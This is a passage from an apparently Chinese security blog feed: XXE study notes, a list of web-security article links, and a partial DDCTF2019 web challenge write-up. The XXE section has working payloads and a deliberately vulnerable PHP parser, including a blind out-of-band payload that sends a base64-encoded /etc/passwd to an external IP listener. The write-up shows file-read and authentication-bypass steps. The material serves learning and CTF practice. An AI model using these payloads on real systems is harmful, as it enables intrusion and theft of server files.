class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">roottag</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">start</span> <span class="meta-string">&quot;&lt;![CDATA[&quot;</span>&gt;</span>   </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">goodies</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///2.txt&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">end</span> <span class="meta-string">&quot;]]&gt;&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://107.182.30.95/evil.dtd&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">%dtd; ]&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">roottag</span>&gt;</span><span class="symbol">&amp;all;</span><span class="tag">&lt;/<span class="name">roottag</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>服务器上放置evil.dtd</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="meta-keyword">all</span> <span class="meta-string">&quot;%start;%goodies;%end;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>结果如下</strong></p><p><img src="http://qiniuyun.zzqsmile.top/blog/20190820/L2e2FpJf6h34.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p><blockquote><p>注意：读取文件时候要注意<code>文件</code>以及<code>文件夹</code>权限问题，否则会读取失败，记录下遇到的这个坑吧，在这浪费了不少时间，烧脑~</p></blockquote><h5 id="实验二：无回显读取本地敏感文件-Blind-OOB-XXE"><a href="#实验二：无回显读取本地敏感文件-Blind-OOB-XXE" class="headerlink" title="实验二：无回显读取本地敏感文件(Blind OOB XXE)"></a>实验二：无回显读取本地敏感文件(Blind OOB XXE)</h5><p><strong>xml.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">libxml_disable_entity_loader (<span class="literal">false</span>);</span><br><span class="line">$xmlfile = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>test.dtd</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">int</span> <span class="meta-string">&quot;&lt;!ENTITY % send SYSTEM &#x27;http://107.182.30.95:9999/?p=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此处需要<strong>注意</strong>，因为实体值中不能有<code>%</code>，故需要将<code>%</code>转成<code>&amp;#37;</code>或者<code>&amp;#x25;</code>，即正确写法如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">int</span> <span class="meta-string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://107.182.30.95:9999/?p=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>或者：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">int</span> <span class="meta-string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://107.182.30.95:9999/?p=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>payload：</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">convert</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://107.182.30.95/test.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>在服务器监听端口，发送payload结果如下：</p><p><img src="http://qiniuyun.zzqsmile.top/blog/20190819/vIveUNB3EuEj.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p><p><img src="http://qiniuyun.zzqsmile.top/blog/20190819/Piw5BFaUg7NS.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p><hr><p>以上就是XXE基本利用方式总结笔记，当然XXE的危害还有很多，由于时间原因，暂不记录。</p><h5 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h5><p><a href="https://xz.aliyun.com/t/3357">1</a></p><p><a href="http://blog.leanote.com/post/xuxi/XXE%E6%80%BB%E7%BB%93">2</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;好记性不如烂笔头，关于XXE还是要记录下自己的学习过程，以后看起来会更清楚，详细原理不再多讲，简单做个实验记录下笔记以便使用。&lt;/p&gt;</summary>
    
    
    
    <category term="web安全" scheme="http://zzqsmile.top/categories/web%E5%AE%89%E5%85%A8/"/>
    
    <category term="XXE" scheme="http://zzqsmile.top/categories/web%E5%AE%89%E5%85%A8/XXE/"/>
    
    
    <category term="XXE" scheme="http://zzqsmile.top/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>优秀文章汇总</title>
    <link href="http://zzqsmile.top/2019/06/06/web%E5%AE%89%E5%85%A8/%E4%BC%98%E7%A7%80%E6%96%87%E7%AB%A0%E6%B1%87%E6%80%BB/"/>
    <id>http://zzqsmile.top/2019/06/06/web%E5%AE%89%E5%85%A8/%E4%BC%98%E7%A7%80%E6%96%87%E7%AB%A0%E6%B1%87%E6%80%BB/</id>
    <published>2019-06-06T01:00:00.000Z</published>
    <updated>2019-09-05T05:58:16.000Z</updated>
    
    <content type="html"><![CDATA[<p>优秀文章传送门</p><a id="more"></a><h6 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h6><ul><li><p><a href="https://security.yirendai.com/news/share/26">浅谈XSS—字符编码和浏览器解析原理</a></p></li><li><p><a href="https://blog.csdn.net/qq_33020901/article/details/87875104">XSS Bypass List</a></p></li></ul><h6 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h6><ul><li><a href="https://www.anquanke.com/post/id/158674">between注入</a></li><li><a href="https://www.smi1e.top/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/">Sql注入笔记</a></li></ul><h6 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h6><ul><li><a href="https://www.secpulse.com/archives/3750.html">解析漏洞总结</a></li><li><a href="https://www.cnblogs.com/shellr00t/p/6426856.html">典型漏洞归纳之解析漏洞</a></li><li><a href="https://www.cnblogs.com/shellr00t/p/6426945.html">典型漏洞归纳之上传漏洞</a></li></ul><h6 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h6><h6 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h6><h6 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h6><h6 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h6><p><a href="https://xz.aliyun.com/t/3357">https://xz.aliyun.com/t/3357</a></p><h6 id="CRLF注入"><a href="#CRLF注入" class="headerlink" title="CRLF注入"></a>CRLF注入</h6><ul><li><a href="https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html">https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html</a></li></ul><h6 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h6><ul><li><p><a href="https://www.secpulse.com/archives/55286.html">常见Web源码泄露总结</a></p></li><li><p><a href="https://www.freebuf.com/articles/web/149761.html">Nginx不安全配置可能导致的安全漏洞</a></p></li></ul><h6 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h6><ul><li><a href="https://www.secpulse.com/archives/61101.html">未授权访问漏洞总结</a></li></ul><h6 id="综合经验篇"><a href="#综合经验篇" class="headerlink" title="综合经验篇"></a>综合经验篇</h6><ul><li><p><a href="https://xz.aliyun.com/t/6194?spm=5176.12901015.0.i12901015.11f1525cQKCN4b&accounttraceid=32dd5dec-db8a-48f2-9de8-accf4febe558">以购物流程挖掘商城漏洞</a></p></li><li><p><a href="https://www.freebuf.com/vuls/211842.html">全程带阻：记一次授权网络攻防演练（上）</a></p></li><li><p><a href="https://www.freebuf.com/vuls/211847.html">全程带阻：记一次授权网络攻防演练（下）</a></p></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;优秀文章传送门&lt;/p&gt;</summary>
    
    
    
    <category term="收藏文章" scheme="http://zzqsmile.top/categories/%E6%94%B6%E8%97%8F%E6%96%87%E7%AB%A0/"/>
    
    
    <category term="传送门" scheme="http://zzqsmile.top/tags/%E4%BC%A0%E9%80%81%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>DDCTF2019部分web题Write Up</title>
    <link href="http://zzqsmile.top/2019/04/18/CTF/DDCTF_2019_%E9%83%A8%E5%88%86WEB%E9%A2%98%E8%A7%A3/"/>
    <id>http://zzqsmile.top/2019/04/18/CTF/DDCTF_2019_%E9%83%A8%E5%88%86WEB%E9%A2%98%E8%A7%A3/</id>
    <published>2019-04-18T08:00:00.000Z</published>
    <updated>2019-04-18T12:05:38.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文主要记录<code>DDCTF2019</code>中部分web赛题的解题过程，仅学习参考使用。</p></blockquote><a id="more"></a><p><strong>声明：语言表达能力有限，本问仅供学习参考，大佬勿喷！</strong></p><h5 id="滴"><a href="#滴" class="headerlink" title="滴~"></a>滴~</h5><ul><li><p>题目地址<br>  <a href="http://117.51.150.246/">http://117.51.150.246</a></p></li><li><p>解题过程</p></li></ul><p>1).首先打开题目，url为<code>http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09</code>，图中出现两个flag.jpg，和一个心情复杂的表情包。看一下源码，发现应该是将文件内容进行base64编码，然后当作图片的内容输出。</p><p><img src="https://upload-images.jianshu.io/upload_images/8166147-36e45b022ca4345d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/8166147-e529f54bd750db4d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>2).第一反应是文件包含，jpg参数看不懂。<code>TmpZMlF6WXhOamN5UlRaQk56QTJOdz09</code>，解码看看，通过先进行两次base64解码，再对解码解码进行16进制解码，发现结果为<code>flag.jpg</code>。由此可以知道，文件名需要先进行16进制编码，再进行两次base64编码。</p><p>3).尝试读取<code>/etc/passwd</code>，但是好像不能够目录跳转，过滤了<code>/</code>。</p><p><img src="https://upload-images.jianshu.io/upload_images/8166147-b4808cc88f67705f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>4).试一试读取index.php内容，初步猜想，读取源码，进行代码审计。</p><p><img src="https://upload-images.jianshu.io/upload_images/8166147-c080e30ea6a2b34a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/8166147-8852a9bdd4e24bf0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>5).将base64部分解码，得到index.php源码如下。</p><p><img src="https://upload-images.jianshu.io/upload_images/8166147-1185f76c3c6f83a6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * https://blog.csdn.net/FengBanLiuYun/article/details/80616607</span></span><br><span class="line"><span class="comment"> * Date: July 4,2018</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE);</span><br><span class="line"></span><br><span class="line">header(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(! <span class="keyword">isset</span>($_GET[<span class="string">&#x27;jpg&#x27;</span>]))</span><br><span class="line">    header(<span class="string">&#x27;Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09&#x27;</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">&#x27;jpg&#x27;</span>])));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;title&gt;&#x27;</span>.$_GET[<span class="string">&#x27;jpg&#x27;</span>].<span class="string">&#x27;&lt;/title&gt;&#x27;</span>;</span><br><span class="line">$file = preg_replace(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>,<span class="string">&quot;&quot;</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> $file.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">$file = str_replace(<span class="string">&quot;config&quot;</span>,<span class="string">&quot;!&quot;</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> $file.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">$txt = base64_encode(file_get_contents($file));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span>.$txt.<span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Can you find the flag file?</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>6).看来思路没错，接下来看文件代码，发现代码是一些基本的功能输出，并没有解题的线索，唯一吸引注意的是注释部分，发现了一个博客地址。</p><p><img src="https://upload-images.jianshu.io/upload_images/8166147-5c27767df59ce7a4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><blockquote><p>打开博客，再别人提示下注意到这篇文章，看到这我不得不吐槽一句，出题人脑子有坑吧，线索在博客中就不说了，你倒是直接链接到这篇文章也行啊，坑爹！接下来看看这篇文章，其实没啥看的，就是linux下文件意外退出，会留下一个.swp交换文件。</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/8166147-a87dd039f83406d7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>7).那就是文章中说的这个<code>practice.txt.swp</code>隐藏文件吧。于是继续读取文件源码吧，还是将<code>practice.txt.swp</code>文件通过<code>hex()——&gt;base64()——&gt;base64()</code>顺序编码，然后读取内容。</p><p><img src="https://upload-images.jianshu.io/upload_images/8166147-226bb7b2325d7b2d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/8166147-bf34853077c24a11.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/8166147-bd8c28b28f2dc2c3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><blockquote><p>看到了<code>practice.txt.swp</code>里面内容为<code>f1ag!ddctf.php</code>，到这个地方明显离成功不远了，应该就是继续读取<code>f1ag!ddctf.php</code>文件内容了。</p></blockquote><p>8). 之前在读取index.php文件时候，注意以下代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$file = preg_replace(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>,<span class="string">&quot;&quot;</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> $file.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">$file = str_replace(<span class="string">&quot;config&quot;</span>,<span class="string">&quot;!&quot;</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> $file.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><blockquote><p>很明显意思就是文件名在<code>a-zA-Z0-9.</code>中，不能有<code>!</code>，但是下面一行代码是将<code>config</code>字符串替换为<code>!</code>，分析完其实很简单了，要将<code>f1ag!ddctf.php</code>名变成<code>f1agconfigddctf.php</code>就行了。</p></blockquote><p>9).读取<code>f1ag!ddctf.php</code>内容。</p><p><img src="https://upload-images.jianshu.io/upload_images/8166147-a95281ea359b69f9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/8166147-4c57a21657cd6175.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/8166147-899a0547610a254d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line">$k = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($uid))</span><br><span class="line">&#123;</span><br><span class="line">    $content=trim(file_get_contents($k));</span><br><span class="line">    <span class="keyword">if</span>($uid==$content)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span><span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>10). 审计<code>f1ag!ddctf.php</code>，发现这个出题人可能脑子短路了吧，在这先说结论，php代码中<code>$content=&#39;&#39;</code>，因此我们只需要传入<code>uid=</code>即可拿到<code>flag</code>，因为题目本身就不存在名为<code>hello</code>的文件，或者就是<code>hello</code>文件里面为空，所以<code>file_get_contents($k)</code>的值返回<code>false</code>，然后再经过<code>trim()</code>函数，<code>false</code>被转换成空字符串<code>&quot;&quot;</code>，因此，传入<code>uid</code>等于空即可绕过判断得到flag。注意此处绝对不能想错了误以为file_get_contents($k)会将返回值复制给变量。因此说出题人本来是想考察<code>extract()</code>变量覆盖的，结果弄巧成拙,代码中即使<code>==</code>换成<code>===仍然成立</code>，这样看来这道题最后还变简单了。</p><p><img src="https://upload-images.jianshu.io/upload_images/8166147-5986ec81f4d91fd9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><blockquote><p>假如我将<code>$k</code>值覆盖掉为一个存在的文件名<code>config.php</code>，如下：</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/8166147-842da6bea4987dc5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><strong>看到此处相信都明白我所说的意思了吧，如有疑惑建议亲自动手实践解惑!</strong></p><hr><h5 id="WEB签到题"><a href="#WEB签到题" class="headerlink" title="WEB签到题"></a>WEB签到题</h5><ul><li><p>题目地址</p><p>  <a href="http://117.51.158.44/index.php">http://117.51.158.44/index.php</a></p></li><li><p>解题过程</p><p>  1.首先打开题目，如下图所示：抱歉，您没有登陆权限，请获取权限后访问    —–</p><p>  <img src="https://upload-images.jianshu.io/upload_images/8166147-630d8fbe81b1e38b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>  2.很明显首先要绕过认证才能访问，通过源码信息查看，发现了一个<code>ajax请求</code>，如下所示：</p><p>  <img src="https://upload-images.jianshu.io/upload_images/8166147-320d8172e04bae71.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>  3.发现<code>didictf_username</code>字段可能是一个认证字段，于是走流程抓包发现<code>didictf_username</code>字段，但是不知道名字啊，这个时候就要根据经验了，试试<code>admin</code>吧，果不其然，通过验证，如下所示：</p><p>  <img src="https://upload-images.jianshu.io/upload_images/8166147-eeb56cafad1dc544.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>  4.通过验证之后显示结果为：您当前当前权限为管理员—-请访问:<code>app/fL2XID2i0Cdh.php</code></p><p>  <img src="https://upload-images.jianshu.io/upload_images/8166147-aa661163884cb753.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>  5.下面接着访问<code>app/fL2XID2i0Cdh.php</code>，发现了是两个php文件源码，这就很明显了，接下来就是代码审计，绕过流程，输出flag了。</p><p>  <strong>url:app/Application.php</strong></p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $path = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">response</span>(<span class="params">$data, $errMsg = <span class="string">&#x27;success&#x27;</span></span>) </span>&#123;</span><br><span class="line">        $ret = [<span class="string">&#x27;errMsg&#x27;</span> =&gt; $errMsg,</span><br><span class="line">            <span class="string">&#x27;data&#x27;</span> =&gt; $data];</span><br><span class="line">        $ret = json_encode($ret);</span><br><span class="line">        header(<span class="string">&#x27;Content-type: application/json&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> $ret;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">auth</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $DIDICTF_ADMIN = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">&#x27;HTTP_DIDICTF_USERNAME&#x27;</span>]) &amp;&amp; $_SERVER[<span class="string">&#x27;HTTP_DIDICTF_USERNAME&#x27;</span>] == $DIDICTF_ADMIN) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response(<span class="string">&#x27;您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">TRUE</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response(<span class="string">&#x27;抱歉，您没有登陆权限，请获取权限后访问-----&#x27;</span>,<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizepath</span>(<span class="params">$path</span>) </span>&#123;</span><br><span class="line">    $path = trim($path);</span><br><span class="line">    $path=str_replace(<span class="string">&#x27;../&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$path);</span><br><span class="line">    $path=str_replace(<span class="string">&#x27;..\\&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$path);</span><br><span class="line">    <span class="keyword">return</span> $path;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;path)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $path = <span class="keyword">$this</span>-&gt;sanitizepath(<span class="keyword">$this</span>-&gt;path);</span><br><span class="line">        <span class="keyword">if</span>(strlen($path) !== <span class="number">18</span>) &#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;response($data=file_get_contents($path),<span class="string">&#x27;Congratulations&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  <strong>url:app/Session.php</strong></p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 